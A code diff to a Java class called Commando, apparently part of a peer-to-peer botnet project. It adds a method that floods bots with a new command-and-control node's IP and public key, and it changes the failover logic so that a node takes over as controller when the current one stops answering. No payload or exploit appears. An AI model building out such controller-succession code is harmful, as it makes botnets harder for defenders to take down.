@@ -248,6 +248,13 @@ public class Commando {
 		flooding(msg);
 		return false;
 	}
+	
+	public boolean updateKingFlood(IP ip, String pk) {
+		String msg = "update<CC>" + ip + "<CC>" + pk;
+		flooding(msg);
+		return false;
+	}
+	
 
 	public boolean abdicate() {
 
@@ -265,8 +272,7 @@ public class Commando {
 			nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>(ip, pki.rebuildPuK(pk)));
 			pServ.setNewKing("");
 			nServ.setAliveBot(new SyncIpList<IP,String>());
-			Integer counter=nServ.getCounterCeCMemory();
-			nServ.setCounterCeCMemory(counter++);
+			nServ.setCounterCeCMemory(1);
 			return true;
 		}
 		return false;
@@ -361,11 +367,12 @@ public class Commando {
 		return null;
 	}
 
+	
 	public void legacy(){
 		Boolean b=bReq.pingToCec(nServ.getCommandConquerIps().get(0).getValue1().toString());
 		if(!b){
-			newKingDns(nServ.getMyIp(),nServ.getPki().getPubRSAKeyToString());
-			newKingFlood(nServ.getMyIp(), nServ.getPki().getPubRSAKeyToString());
+			newKingDns(nServ.getMyIp(),nServ.getPki().getPubRSAKeyToString());			
+			 updateKingFlood(nServ.getMyIp(), nServ.getPki().getPubRSAKeyToString());
 		}else{
 			System.out.println("CeC vivo e funzionante");
 		}
